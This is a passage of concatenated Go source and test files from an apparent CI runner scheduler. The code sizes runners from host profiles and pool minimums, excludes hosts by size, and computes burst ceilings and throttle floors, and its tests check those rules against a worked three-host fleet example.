			said := strings.Contains(byName["high"].Reason, "deferred for fairness across priorities")
			if said != tc.deferred {
				t.Errorf("high reason = %q, want deferred-for-fairness %v", byName["high"].Reason, tc.deferred)
			}
		})
	}
}

// The share is one create per waiting pool, not a split of the budget: it
// stops the starvation, and priority still decides everything after it.
func TestTheShareAcrossPrioritiesIsOneCreatePerWaitingPool(t *testing.T) {
	high, mid, low := testPool("high", "high"), testPool("mid", "mid"), testPool("low", "low")
	high.Priority, mid.Priority, low.Priority = 10, 5, 0
	var jobs []*store.Job
	for _, id := range []string{"h1", "h2", "h3", "h4"} {
		jobs = append(jobs, queued(id, time.Minute, "high"))
	}
	jobs = append(jobs, queued("m1", time.Minute, "mid"), queued("m2", time.Minute, "mid"),
		queued("l1", time.Minute, "low"), queued("l2", time.Minute, "low"))
	s := snap([]*store.Pool{high, mid, low}, nil, jobs, []*store.Host{testHost("host_a", 20, 0)})
	s.Policy.MaxCreatesPerTick = 4
	s.Policy.Interval = 30 * time.Second

	got := map[string]int{}
	reasons := map[string]string{}
	for _, pp := range Decide(s).Pools {
		got[pp.PoolName] = countOf(pp.Actions, ActionCreate)
		reasons[pp.PoolName] = pp.Reason
	}
	if got["high"] != 2 || got["mid"] != 1 || got["low"] != 1 {
		t.Fatalf("creates = %v, want high 2, mid 1, low 1", got)
	}
	// mid is above the lowest pool that took a share, so its shortfall is the
	// share's doing too; low's is only the budget.
	for _, name := range []string{"high", "mid"} {
		if !strings.Contains(reasons[name], "deferred for fairness across priorities") {
			t.Errorf("%s reason = %q, want it to say it was deferred for fairness", name, reasons[name])
		}
	}
	if strings.Contains(reasons["low"], "deferred for fairness") || !strings.Contains(reasons["low"], "global limit") {
		t.Errorf("low reason = %q, want only the global limit", reasons["low"])
	}
}

package scheduler

import (
	"fmt"

	"github.com/eyupio/zoomies/internal/store"
)

// Where one figure of a runner's size came from, in the words the API and the
// problems use. The scheduler's own copies of a pool do not carry it -- a
// minimum inherited from the fleet looks like the pool's own once it is on the
// copy -- so the controller works provenance out from the stored pool, the
// host's profile and the fleet's settings, and these are only the vocabulary.
const (
	// SourcePool is a figure the pool itself states.
	SourcePool = "pool"
	// SourceHost is a figure the host's runner profile states, or one cut from
	// the host's own slots.
	SourceHost = "host"
	// SourceGlobal is the fleet's own setting (runners.*), where neither the
	// pool nor the host said anything.
	SourceGlobal = "global"
)

// sizedOn returns p as it is sized on h: the pool with the larger of its own
// minimum and the host's, on each field the host has one for. The host never
// lowers a minimum, and it never raises one past a size the pool states --
// that pool is not placed here at all (ExcludedBySize), because a runner of a
// pool that said how big it is must not be made bigger by the machine it
// happens to land on.
//
// It is what makes "the larger of the two minimums" true of every sum below
// without each of them knowing about hosts: a share thinner than the minimum
// is raised to it, a runner is reduced no further than it, and the charge
// follows, all from the one pool the existing code already reads. It is
// idempotent, so a function that calls another that also applies it is
// harmless, and it returns p itself when the host adds nothing.
func sizedOn(p *store.Pool, h *store.Host) *store.Pool {
	if p == nil || h == nil {
		return p
	}
	floor := h.RunnerProfile.Minimum
	cpus := raisedMinimum(p.Resources.MinCPUs, floor.CPUs, p.Resources.CPUs)
	memoryMB := int64(raisedMinimum(float64(p.Resources.MinMemoryMB), float64(floor.MemoryMB), float64(p.Resources.MemoryMB)))
	if cpus == p.Resources.MinCPUs && memoryMB == p.Resources.MinMemoryMB {
		return p
	}
	cp := *p
	cp.Resources.MinCPUs, cp.Resources.MinMemoryMB = cpus, memoryMB
	return &cp
}

// raisedMinimum is one field of sizedOn: the pool's minimum, or the host's where
// that is larger and does not pass the size the pool states (typed, zero when
// the pool leaves the field to the host).
func raisedMinimum(own, host, typed float64) float64 {
	if host <= own || (typed > 0 && host > typed) {
		return own
	}
	return host
}

// StandardSize is the size of one runner of a profile pool on h, per field: the
// host's own standard where its profile names one, and the fleet's default
// where it does not -- carried on the pool, Pool.FleetStandard, because the
// scheduler cannot read settings. Zero on a field where neither says, and on
// every pool that does not take its size from the host; the callers read zero
// as "a slot's share", which is how such a pool was sized before profiles.
func StandardSize(p *store.Pool, h *store.Host) (cpus float64, memoryMB int64) {
	if p == nil || !p.SizeFromProfile {
		return 0, 0
	}
	cpus, memoryMB = p.FleetStandard.CPUs, p.FleetStandard.MemoryMB
	if h != nil {
		if c := h.RunnerProfile.Standard.CPUs; c > 0 {
			cpus = c
		}
		if m := h.RunnerProfile.Standard.MemoryMB; m > 0 {
			memoryMB = m
		}
	}
	return cpus, memoryMB
}

// slotSize is what one slot of h is worth to p: the host's slot share, with the
// standard size laid over it for a pool that takes its size from the host. It
// is HostShare as the pool sees it, and every figure that was a slot's share
// for an automatic pool reads from here, so the two modes cannot disagree
// about what a runner is on the same machine.
func slotSize(p *store.Pool, h *store.Host) store.Resources {
	out := HostShare(h)
	cpus, memoryMB := StandardSize(p, h)
	if cpus > 0 {
		out.CPUs = cpus
	}
	if memoryMB > 0 {
		out.MemoryMB = memoryMB
	}
	return out
}

// SizeExclusion is a limit that keeps a pool off a host because of what the
// two say about runner size: the pool states a size the host's minimum is
// above, or the pool takes its size from the host and the host's standard is
// below the pool's floor. It names the limit, because "this host was left out"
// is a complaint and "its minimum runner is 3 CPU and the pool gives 2" is
// something an operator can act on.
type SizeExclusion struct {
	// Code is "host_minimum" for the first and "host_standard" for the second.
	Code string
	// Field is "cpu" or "memory": the dimension that did it.
	Field string
	// Reason finishes "this host is not used because": a lower-case sentence
	// that begins "its", like HostShortfall's, and says what to change.
	Reason string
}

const (
	// ExclusionHostMinimum is a host whose minimum runner is above the size a
	// pool states.
	ExclusionHostMinimum = "host_minimum"
	// ExclusionHostStandard is a host whose standard runner is below the floor
	// of a pool that takes its size from the host.
	ExclusionHostStandard = "host_standard"
)

// ExcludedBySize reports whether h's runner profile keeps p off it, and which
// limit does. It is nil for every host without a profile and for every pool
// that is not asking about one of its figures, so it changes nothing until an
// operator has said something.
//
// A pool that states its size is never silently made bigger -- the host's
// minimum above it excludes the host rather than raising the runner -- and a
// pool that takes its size from the host is never silently made smaller than
// its own floor: a host whose standard is below that floor is not one it can
// use. A pool that leaves its size to a slot's share is in neither case: its
// runner is the share, and a minimum above that raises the share
// (MinimumSlot) rather than excluding the host.
func ExcludedBySize(h *store.Host, p *store.Pool) *SizeExclusion {
	if h == nil || p == nil {
		return nil
	}
	floor := h.RunnerProfile.Minimum
	switch {
	case p.SizeFromProfile:
		cpus, memoryMB := StandardSize(p, h)
		poolMin := p.Resources.MinCPUs
		if cpus > 0 && max(poolMin, floor.CPUs) > cpus+cpuEpsilon {
			whose, need := poolsOrFleets(p.FleetMinimum.CPUs > 0), poolMin
			if floor.CPUs >= poolMin {
				whose, need = "this host's own", floor.CPUs
			}
			return &SizeExclusion{ExclusionHostStandard, "cpu", fmt.Sprintf(
				"%s, below %s minimum of %s CPU -- give the host a standard runner of at least that, or lower the minimum",
				standardPhrase(formatCPUs(cpus)+" CPU", h.RunnerProfile.Standard.CPUs > 0), whose, formatCPUs(need))}
		}
		poolMinMemory := p.Resources.MinMemoryMB
		if memoryMB > 0 && max(poolMinMemory, floor.MemoryMB) > memoryMB {
			whose, need := poolsOrFleets(p.FleetMinimum.MemoryMB > 0), poolMinMemory
			if floor.MemoryMB >= poolMinMemory {
				whose, need = "this host's own", floor.MemoryMB
			}
			return &SizeExclusion{ExclusionHostStandard, "memory", fmt.Sprintf(
				"%s, below %s minimum of %s -- give the host a standard runner of at least that, or lower the minimum",
				standardPhrase(formatMB(memoryMB)+" of memory", h.RunnerProfile.Standard.MemoryMB > 0), whose, formatMB(need))}
		}
	case !p.Automatic():
		if p.Resources.CPUs > 0 && floor.CPUs > p.Resources.CPUs+cpuEpsilon {
			return &SizeExclusion{ExclusionHostMinimum, "cpu", fmt.Sprintf(
				"its minimum runner size is %s CPU, above the %s CPU this pool gives each runner, and a pool that states its size is never given more than it states -- lower the host's minimum, or raise the pool's CPU",
				formatCPUs(floor.CPUs), formatCPUs(p.Resources.CPUs))}
		}
		if p.Resources.MemoryMB > 0 && floor.MemoryMB > p.Resources.MemoryMB {
			return &SizeExclusion{ExclusionHostMinimum, "memory", fmt.Sprintf(
				"its minimum runner size is %s of memory, above the %s this pool gives each runner, and a pool that states its size is never given more than it states -- lower the host's minimum, or raise the pool's memory",
				formatMB(floor.MemoryMB), formatMB(p.Resources.MemoryMB))}
		}
	}
	return nil
}

// poolsOrFleets names whose minimum a figure is: the pool's own, or the
// fleet's where the pool follows it -- an operator told "this pool's minimum"
// would go looking for a field the pool never set.
func poolsOrFleets(fleet bool) string {
	if fleet {
		return "the fleet's"
	}
	return "this pool's"
}

// standardPhrase says what a host's standard runner is, and where the figure
// came from, because a host that names none is sized by the fleet and a
// sentence that blamed its "standard" would send an operator to a field the
// host does not have. The figure carries its unit.
func standardPhrase(figure string, fromHost bool) string {
	if fromHost {
		return "its standard runner is " + figure
	}
	return "its profile names no standard runner size, so the fleet's default of " + figure + " applies"
}

// BurstLimit is the most CPU one runner of p may use on h -- its guarantee and
// whatever it is lent together -- where either side has said: the smaller of
// the pool's ceiling and the host's. An unset side does not count, so a pool
// with a ceiling and a host with none keeps the pool's, and neither set is
// zero, which callers read as "as much as the host's allocatable CPU".
//
// The host's ceiling can only lower the pool's, never raise it: whoever owns
// the machine has the last word on how much of it one job may take, and a
// pool asking for more than the host will give simply gets what it will.
func BurstLimit(p *store.Pool, h *store.Host) float64 {
	pool := 0.0
	if p != nil {
		pool = p.CPUBurst.MaxCPUs
	}
	host := 0.0
	if h != nil {
		host = h.RunnerProfile.Standard.BurstMaxCPUs
	}
	switch {
	case pool > 0 && host > 0:
		return min(pool, host)
	case pool > 0:
		return pool
	default:
		return host
	}
}

package scheduler

import (
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// The fleet the documentation works through: one 12-CPU machine and two
// 4-CPU ones. The memory figures are what is left after the reserve, so the
// arithmetic in the tests is the arithmetic on the page: 11.4 CPU and 30 GB on
// the big host, 3.5 CPU and 15 GB on each small one.
func bigHost(id string) *store.Host {
	h := sized(id, 8, 12, hostFor(30*1024), 100000)
	h.RunnerProfile = store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 3, MemoryMB: 8 * 1024}}
	return h
}

func smallHost(id string) *store.Host {
	h := sized(id, 8, 4, hostFor(15*1024), 100000)
	h.RunnerProfile = store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 1.5, MemoryMB: 4 * 1024}}
	return h
}

// profilePool is a pool that takes its size from the host, with the fleet's
// default size on the copy the way the controller hands it over.
func profilePool(name string, minCPUs float64, minMemoryMB int64) *store.Pool {
	p := testPool(name, name)
	p.SizeFromProfile = true
	p.FleetStandard = store.RunnerSize{CPUs: 2, MemoryMB: 4096}
	p.Resources.MinCPUs, p.Resources.MinMemoryMB = minCPUs, minMemoryMB
	return p
}

// Nothing may change for a host nobody has written a profile for, or for a
// pool that does not ask about one: that is the whole compatibility promise,
// so it is stated as a property of the functions rather than left to the
// existing tests happening to cover it.
func TestAHostWithNoProfileIsSizedExactlyAsBefore(t *testing.T) {
	h := sized("plain", 4, 8, hostFor(16*1024), 100000)
	for _, p := range []*store.Pool{
		testPool("automatic", "a"),
		limited("fixed", 2, 2048),
		withMinimum("reducible", 4, 8192, 1, 2048),
		automatic("auto-min", 1, 1024),
	} {
		if got := sizedOn(p, h); got != p {
			t.Errorf("%s: an unprofiled host copied the pool", p.Name)
		}
		if ex := ExcludedBySize(h, p); ex != nil {
			t.Errorf("%s: an unprofiled host excluded it: %s", p.Name, ex.Reason)
		}
		if cpus, memory := StandardSize(p, h); cpus != 0 || memory != 0 {
			t.Errorf("%s: a pool that does not take its size from the host was given a standard of %g and %d", p.Name, cpus, memory)
		}
	}
	if got := h.Slots(); got != 4 {
		t.Errorf("an unprofiled host has %d slots, want its capacity of 4", got)
	}
	if got := BurstLimit(testPool("a", "a"), h); got != 0 {
		t.Errorf("an unprofiled host and a pool with no ceiling gave a ceiling of %g", got)
	}
}

// A profile pool is sized by the host: the standard it names, and the fleet's
// default where it names none. A docker-in-docker pair is charged one standard
// and splits it, exactly as a share is, so the size the host names is what the
// job gets between its two containers rather than twice that.
func TestAProfilePoolIsGivenTheHostsStandardSize(t *testing.T) {
	h := bigHost("big")
	p := profilePool("heavy", 0, 0)

	if got := Reserve(p, h); got.CPUs != 3 || got.MemoryMB != 8*1024 {
		t.Fatalf("Reserve = %g CPU and %d MB, want the host's standard of 3 and 8192", got.CPUs, got.MemoryMB)
	}
	res, source := Allocation(p, h, true)
	if res.CPUs != 3 || res.MemoryMB != 8*1024 || source != store.AllocationFromProfile {
		t.Fatalf("Allocation = %+v from %q, want 3 CPU and 8192 MB from the profile", res, source)
	}

	p.DockerMode = store.DockerDinD
	if got := Reserve(p, h); got.CPUs != 3 || got.MemoryMB != 8*1024 {
		t.Fatalf("a docker-in-docker pair is charged %g CPU and %d MB, want one standard of 3 and 8192 -- the pair splits it", got.CPUs, got.MemoryMB)
	}
}

func TestAProfilePoolOnAHostWithNoStandardGetsTheFleetsDefault(t *testing.T) {
	h := sized("plain", 4, 12, hostFor(30*1024), 100000)
	p := profilePool("heavy", 0, 0)

	got := Reserve(p, h)
	if got.CPUs != 2 || got.MemoryMB != 4096 {
		t.Fatalf("Reserve = %g CPU and %d MB, want the fleet's default of 2 and 4096", got.CPUs, got.MemoryMB)
	}
	if _, source := Allocation(p, h, true); source != store.AllocationFromProfile {
		t.Fatalf("the source is %q, want profile: the size is the profile's answer even where the fleet's default stands in for it", source)
	}

	// A host that names only CPU keeps the fleet's default for memory.
	h.RunnerProfile.Standard = store.RunnerStandard{CPUs: 4}
	got = Reserve(p, h)
	if got.CPUs != 4 || got.MemoryMB != 4096 {
		t.Fatalf("Reserve = %g CPU and %d MB, want 4 from the host and 4096 from the fleet", got.CPUs, got.MemoryMB)
	}

	// Without the fleet's figure on the copy -- a caller that did not carry it --
	// the pool is sized by a slot's share, which is what it was before.
	p.FleetStandard = store.RunnerSize{}
	h.RunnerProfile = store.RunnerProfile{}
	want := Reserve(testPool("share", "share"), h)
	if got := Reserve(p, h); got != want {
		t.Fatalf("Reserve = %+v, want a slot's share %+v when neither the host nor the fleet named a size", got, want)
	}
}

// The slot count the standard gives is the divisor of every share, so an
// automatic pool on the same host sees the same slots a profile pool does and
// the host reads as full at the same point for both.
func TestTheSlotsAProfileGivesAreWhatAnAutomaticPoolIsDividedBy(t *testing.T) {
	h := bigHost("big")
	if got := h.Slots(); got != 3 {
		t.Fatalf("Slots() = %d, want 3", got)
	}
	share := HostShare(h)
	if share.CPUs != 3.8 || share.MemoryMB != 10*1024 {
		t.Fatalf("HostShare = %+v, want 11.4 CPU and 30 GB cut into 3: 3.8 and 10240", share)
	}
	if got := Reserve(testPool("auto", "auto"), h); got.CPUs < 3.79 || got.CPUs > 3.81 || got.MemoryMB != 10*1024 {
		t.Fatalf("an automatic pool is charged %+v, want the same share", got)
	}
}

// The host's minimum is the larger of the two: it raises a pool's own and never
// lowers it, and a share too thin for the pool's minimum is raised to it.
func TestAHostsMinimumRaisesAPoolsFloorAndNeverLowersIt(t *testing.T) {
	h := sized("thin", 8, 8, hostFor(16*1024), 100000) // a share of 0.94 CPU and 2 GB
	h.RunnerProfile.Minimum = store.RunnerSize{CPUs: 2, MemoryMB: 4096}

	p := automatic("auto", 0.5, 512)
	if got := Reserve(p, h); got.CPUs != 2 || got.MemoryMB != 4096 {
		t.Fatalf("Reserve = %g CPU and %d MB, want the host's larger minimum, 2 and 4096, where the share is thinner", got.CPUs, got.MemoryMB)
	}

	h.RunnerProfile.Minimum = store.RunnerSize{CPUs: 0.5, MemoryMB: 256}
	p = automatic("auto", 1, 1024)
	if got := sizedOn(p, h); got.Resources.MinCPUs != 1 || got.Resources.MinMemoryMB != 1024 {
		t.Fatalf("a host's smaller minimum lowered the pool's to %g and %d", got.Resources.MinCPUs, got.Resources.MinMemoryMB)
	}

	// The stored pool is never touched: only the copy is raised.
	h.RunnerProfile.Minimum = store.RunnerSize{CPUs: 4, MemoryMB: 8192}
	p = automatic("auto", 1, 1024)
	_ = sizedOn(p, h)
	if p.Resources.MinCPUs != 1 || p.Resources.MinMemoryMB != 1024 {
		t.Fatalf("raising the minimum wrote %g and %d into the pool itself", p.Resources.MinCPUs, p.Resources.MinMemoryMB)
	}
}

// Explicit pool values are unchanged: a pool that states its size is not made
// bigger by a host whose minimum is above it. The host is left out, and says
// which limit did it.
func TestAPoolThatStatesItsSizeIsNeverRaisedByAHostMinimum(t *testing.T) {
	h := sized("picky", 4, 12, hostFor(30*1024), 100000)
	h.RunnerProfile.Minimum = store.RunnerSize{CPUs: 3}
	p := limited("small", 2, 2048)

	ex := ExcludedBySize(h, p)
	if ex == nil || ex.Code != ExclusionHostMinimum || ex.Field != "cpu" {
		t.Fatalf("ExcludedBySize = %+v, want the host's CPU minimum", ex)
	}
	for _, want := range []string{"minimum runner size is 3 CPU", "above the 2 CPU this pool gives", "never given more than it states"} {
		if !strings.Contains(ex.Reason, want) {
			t.Errorf("the reason %q does not say %q", ex.Reason, want)
		}
	}
	if HostFits(h, p) || HostCouldRun(h, p) {
		t.Fatal("the host was left in for a pool whose size it is above")
	}
	if !strings.Contains(HostShortfall(h, p), "minimum runner size is 3 CPU") {
		t.Fatalf("the shortfall does not say what excluded the host: %q", HostShortfall(h, p))
	}
	if room := HostRoomFor(h, p); room.Room != 0 || room.LimitedBy != "profile" {
		t.Fatalf("HostRoomFor = %+v, want no room, limited by the profile", room)
	}

	// At or below the pool's size the host is fine, and the runner is the
	// pool's own size: the minimum is a floor under a reduction, not a size.
	h.RunnerProfile.Minimum = store.RunnerSize{CPUs: 2, MemoryMB: 1024}
	if ExcludedBySize(h, p) != nil || !HostFits(h, p) {
		t.Fatal("a minimum equal to the pool's size excluded the host")
	}
	if got := Reserve(p, h); got.CPUs != 2 || got.MemoryMB != 2048 {
		t.Fatalf("Reserve = %g CPU and %d MB, want the pool's own 2 and 2048", got.CPUs, got.MemoryMB)
	}

	memory := sized("memory", 4, 12, hostFor(30*1024), 100000)
	memory.RunnerProfile.Minimum = store.RunnerSize{MemoryMB: 4096}
	if ex := ExcludedBySize(memory, p); ex == nil || ex.Field != "memory" || !strings.Contains(ex.Reason, "4 GB") {
		t.Fatalf("a memory minimum above the pool's gave %+v", ex)
	}
}

// A host is eligible for a profile pool only if its standard meets the pool's
// floor. The standard may be the host's own or the fleet's default standing in
// for it, and the sentence says which, because the fix is a different field.
func TestAProfilePoolIsNotPlacedWhereTheStandardIsBelowItsFloor(t *testing.T) {
	p := profilePool("heavy", 3, 6*1024)

	small := smallHost("small")
	ex := ExcludedBySize(small, p)
	if ex == nil || ex.Code != ExclusionHostStandard || ex.Field != "cpu" {
		t.Fatalf("ExcludedBySize = %+v, want the small host's CPU standard", ex)
	}
	for _, want := range []string{"its standard runner is 1.5 CPU", "below this pool's minimum of 3 CPU"} {
		if !strings.Contains(ex.Reason, want) {
			t.Errorf("the reason %q does not say %q", ex.Reason, want)
		}
	}
	if ExcludedBySize(bigHost("big"), p) != nil {
		t.Fatal("the big host's standard meets the floor and was excluded")
	}

	// No standard of its own: the fleet's default of 2 CPU is below the floor.
	plain := sized("plain", 4, 12, hostFor(30*1024), 100000)
	ex = ExcludedBySize(plain, p)
	if ex == nil || !strings.Contains(ex.Reason, "names no standard runner size, so the fleet's default of 2 CPU applies") {
		t.Fatalf("a host with no standard gave %+v", ex)
	}

	// Memory is the field that does it when CPU is fine.
	memory := bigHost("memory")
	memory.RunnerProfile.Standard.MemoryMB = 4096
	ex = ExcludedBySize(memory, p)
	if ex == nil || ex.Field != "memory" || !strings.Contains(ex.Reason, "below this pool's minimum of 6 GB") {
		t.Fatalf("a memory standard under the floor gave %+v", ex)
	}

	// The host's own minimum above its own standard is the host contradicting
	// itself, and the sentence blames the host's minimum rather than the pool's.
	odd := bigHost("odd")
	odd.RunnerProfile.Minimum = store.RunnerSize{CPUs: 5}
	free := profilePool("free", 0, 0)
	ex = ExcludedBySize(odd, free)
	if ex == nil || !strings.Contains(ex.Reason, "below this host's own minimum of 5 CPU") {
		t.Fatalf("a host minimum above its standard gave %+v", ex)
	}
	if HostFits(small, p) {
		t.Fatal("HostFits kept a host the pool is excluded from")
	}
}

// A profile pool never has a reduced runner: it is excluded where the standard
// is below the floor instead, so no runner is ever given less than the pool's
// minimum, and none given less than the host's standard unless the host is
// busy -- where the existing reduction down to the floor still applies.
func TestAProfilePoolIsReducedOnlyDownToItsFloorOnABusyHost(t *testing.T) {
	h := bigHost("big")
	p := profilePool("heavy", 2, 4*1024)
	r := &store.Runner{ID: "r1", PoolID: p.ID, HostID: h.ID, State: store.RunnerBusy, AllocatedCPUs: 3, AllocatedMemoryMB: 8 * 1024, AllocationSource: store.AllocationFromProfile}
	h.ActiveRunners = 1
	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, map[string][]*store.Runner{p.ID: {r}}, now)

	// Plenty of room: the second runner is a whole standard.
	got := hs.placeAvoiding(p, 1, nil)
	if len(got) != 1 || got[0].size != nil {
		t.Fatalf("placed %+v, want one runner at the standard size", got)
	}
}

// What the scheduler says to an operator whose pool has nowhere to go because
// of a profile names the limit and what to change, and does not call the fleet
// full or the host too small.
func TestAPoolExcludedByEveryProfileSaysWhichLimitDidIt(t *testing.T) {
	p := profilePool("heavy", 3, 0)
	hosts := []*store.Host{smallHost("small-a"), smallHost("small-b")}
	hs := newHostSet(hosts, []*store.Pool{p}, nil, now)

	if got := hs.place(p, 1); len(got) != 0 {
		t.Fatalf("placed %v on hosts whose standard is below the pool's floor", got)
	}
	b := hs.why(p)
	for _, want := range []string{"2 excluded by their runner profile", "small-a: its standard runner is 1.5 CPU"} {
		if !strings.Contains(b.what, want) {
			t.Errorf("the explanation %q does not say %q", b.what, want)
		}
	}
	if !strings.Contains(b.fix, "minimum or standard runner size") {
		t.Errorf("the fix %q does not name the fields to change", b.fix)
	}
	if b.atCapacity {
		t.Error("a pool excluded by profile was called at capacity, which is a reason to wait")
	}
	if !b.noEligibleHost {
		t.Error("a pool excluded by profile was not reported as having no host that could ever run it")
	}
}

// The worked example the documentation walks through, so that the page and
// the code cannot disagree about it.
func TestTheMixedFleetExample(t *testing.T) {
	big, a, b := bigHost("big"), smallHost("small-a"), smallHost("small-b")

	if big.Slots() != 3 || a.Slots() != 2 || b.Slots() != 2 {
		t.Fatalf("slots = %d, %d, %d, want 3, 2, 2", big.Slots(), a.Slots(), b.Slots())
	}

	anywhere := profilePool("ci", 0, 0)
	heavy := profilePool("heavy", 3, 0)
	for _, h := range []*store.Host{big, a, b} {
		if room := HostRoomFor(h, anywhere); room.Room != h.Slots() {
			t.Errorf("%s: room for %d of the pool with no floor, want its %d slots (%+v)", h.ID, room.Room, h.Slots(), room)
		}
	}
	if room := HostRoomFor(big, heavy); room.Room != 3 {
		t.Errorf("big: room for %d of the pool with a 3 CPU floor, want 3", room.Room)
	}
	for _, h := range []*store.Host{a, b} {
		if room := HostRoomFor(h, heavy); room.Room != 0 || room.LimitedBy != "profile" {
			t.Errorf("%s: room %+v for the pool with a 3 CPU floor, want none, excluded by its profile", h.ID, room)
		}
	}

	// The third pool states a small size, and the large host's own minimum of
	// 2 CPU is what keeps it off that machine: a pool that states its size is
	// never given more than it states, so the host is left out rather than the
	// runner made bigger. The small hosts hold two of its runners each.
	big.RunnerProfile.Minimum = store.RunnerSize{CPUs: 2}
	lint := limited("lint", 1, 2048)
	if ex := ExcludedBySize(big, lint); ex == nil || ex.Code != ExclusionHostMinimum {
		t.Errorf("big: a 2 CPU minimum above the 1 CPU the pool states should keep it off, got %+v", ex)
	}
	if room := HostRoomFor(big, lint); room.Room != 0 || room.LimitedBy != "profile" {
		t.Errorf("big: room %+v for the pool that states 1 CPU, want none, excluded by its profile", room)
	}
	for _, h := range []*store.Host{a, b} {
		if room := HostRoomFor(h, lint); room.Room != 2 {
			t.Errorf("%s: room for %d of the pool that states 1 CPU, want its 2 slots (%+v)", h.ID, room.Room, room)
		}
	}
	// The host's 2 CPU minimum is below the 3 CPU floor of the second pool, so
	// the pool's own floor is the larger of the two and the big host still runs it.
	if room := HostRoomFor(big, heavy); room.Room != 3 {
		t.Errorf("big: room for %d of the pool with a 3 CPU floor once the host has a 2 CPU minimum, want 3", room.Room)
	}
	// And it is the same seven slots the page counts: 3 and 2 and 2.
	if total := big.Slots() + a.Slots() + b.Slots(); total != 7 {
		t.Errorf("the fleet has %d slots, the page says 7", total)
	}
}

// Slots track the host's profile through the pass: the pass stops filling a
// host at the derived count, not at the capacity set beside it.
func TestAPassFillsAProfiledHostToItsDerivedSlotsAndNoFurther(t *testing.T) {
	big := bigHost("big") // capacity 8, but the machine holds 3 standard runners
	p := profilePool("ci", 0, 0)
	hs := newHostSet([]*store.Host{big}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 8); len(got) != 3 {
		t.Fatalf("placed %d runners, want the 3 the machine holds", len(got))
	}
}

func TestTheHostOrderChoosesBetweenHostsThatAllFit(t *testing.T) {
	p := profilePool("ci", 0, 0)
	pick := func(order string, loadBig int) string {
		big, small := bigHost("a-big"), smallHost("b-small")
		// The two hosts' specs are not the same, and the spec score would
		// rank the big one ahead before any order looked; the placement
		// preference's own tests cover that. This one pins what the order
		// decides between hosts of the same rung, so an operator has pinned
		// both to 50 and the machines' own numbers are out of the picture.
		both := 50
		big.PriorityOverride, small.PriorityOverride = &both, &both
		big.ActiveRunners = loadBig
		var runners []*store.Runner
		for i := range loadBig {
			r := testRunner("r"+string(rune('0'+i)), p, store.RunnerBusy, 0)
			r.HostID = big.ID
			r.AllocatedCPUs, r.AllocatedMemoryMB, r.AllocationSource = 3, 8*1024, store.AllocationFromProfile
			runners = append(runners, r)
		}
		hs := newHostSet([]*store.Host{big, small}, []*store.Pool{p}, map[string][]*store.Runner{p.ID: runners}, now)
		hs.order = order
		got := hs.place(p, 1)
		if len(got) != 1 {
			t.Fatalf("%s with %d on the big host: placed %v", order, loadBig, got)
		}
		return got[0]
	}
	for _, tc := range []struct {
		order   string
		loadBig int
		want    string
	}{
		// Both hosts empty: headroom takes the larger machine, and so does
		// the largest standard; best fit fills the smaller first.
		{HostOrderHeadroom, 0, "a-big"},
		{"", 0, "a-big"},
		{HostOrderLargestStandard, 0, "a-big"},
		{HostOrderBestFit, 0, "b-small"},
		// The big host already carries two: headroom now prefers the empty
		// small one, while the largest standard still goes where the big
		// runners are and best fit keeps packing the host it started.
		{HostOrderHeadroom, 2, "b-small"},
		{HostOrderLargestStandard, 2, "a-big"},
		{HostOrderBestFit, 2, "a-big"},
	} {
		if got := pick(tc.order, tc.loadBig); got != tc.want {
			t.Errorf("order %q with %d runners on the big host placed on %s, want %s", tc.order, tc.loadBig, got, tc.want)
		}
	}
}

func TestOnlyKnownHostOrdersAreValid(t *testing.T) {
	for _, ok := range []string{"", "headroom", "largest_standard", "best_fit"} {
		if !ValidHostOrder(ok) {
			t.Errorf("%q was refused", ok)
		}
	}
	for _, bad := range []string{"spread", "Headroom", "largest", "random"} {
		if ValidHostOrder(bad) {
			t.Errorf("%q was accepted", bad)
		}
	}
}

// The host's ceiling can only lower the pool's, and an unset side does not
// count: whoever owns the machine has the last word on how much of it one job
// may take.
func TestTheBurstCeilingIsTheSmallerOfThePoolsAndTheHosts(t *testing.T) {
	for _, tc := range []struct {
		name       string
		pool, host float64
		want       float64
	}{
		{"neither says", 0, 0, 0},
		{"only the pool", 8, 0, 8},
		{"only the host", 0, 6, 6},
		{"the host is lower", 8, 6, 6},
		{"the pool is lower", 4, 6, 4},
		{"equal", 5, 5, 5},
	} {
		t.Run(tc.name, func(t *testing.T) {
			p := testPool("elastic", "elastic")
			p.CPUBurst.MaxCPUs = tc.pool
			h := bigHost("big")
			h.RunnerProfile.Standard.BurstMaxCPUs = tc.host
			if got := BurstLimit(p, h); got != tc.want {
				t.Fatalf("BurstLimit = %g, want %g", got, tc.want)
			}
		})
	}
}

// The floor is the factor that leaves the smallest limited container exactly
// the minimum, capped at one: a container already under it cannot be helped by
// a factor, so the CPU part of the throttle stands down for it.
func TestTheThrottleFloorFactorProtectsTheSmallestLimitedContainer(t *testing.T) {
	for _, tc := range []struct {
		name       string
		minimum    float64
		containers []float64
		want       float64
	}{
		{"no minimum", 0, []float64{1.5, 3}, 0},
		{"nothing limited to protect", 1, nil, 0},
		{"unlimited containers have nothing to scale", 1, []float64{0, 0}, 0},
		{"the smallest sets it", 1, []float64{3, 1.5, 6}, 1.0 / 1.5},
		{"one container", 1, []float64{4}, 0.25},
		{"a container already at the minimum", 2, []float64{2, 4}, 1},
		{"a container under the minimum stands the factor down", 2, []float64{1.5, 4}, 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := ThrottleFloorFactor(tc.minimum, tc.containers)
			if got < tc.want-1e-9 || got > tc.want+1e-9 {
				t.Fatalf("ThrottleFloorFactor(%v, %v) = %v, want %v", tc.minimum, tc.containers, got, tc.want)
			}
		})
	}
}

// The percentage on the host card is the ladder's, and the host's own minimum
// is what can make a runner's share larger than it; the sentence says so where
// it can be true and not otherwise.
func TestAThrottledHostWithAMinimumSaysItWillNotGoBelowIt(t *testing.T) {
	h := sized("big", 8, 12, hostFor(30*1024), 100000)
	h.ActiveRunners = 2
	h.Throttle = store.HostThrottle{Level: 2, Reason: "CPU stayed above 85%"}

	if got := ThrottleReason(h); strings.Contains(got, "never below") {
		t.Fatalf("a host with no minimum says %q", got)
	}
	h.RunnerProfile.Minimum = store.RunnerSize{CPUs: 1.5}
	if got := ThrottleReason(h); !strings.Contains(got, "at 50% of it, but never below this host's minimum of 1.5 CPU a runner") {
		t.Fatalf("the sentence does not name the host's floor: %q", got)
	}
	// And the slot count it quotes is the profile's, not the capacity beside it.
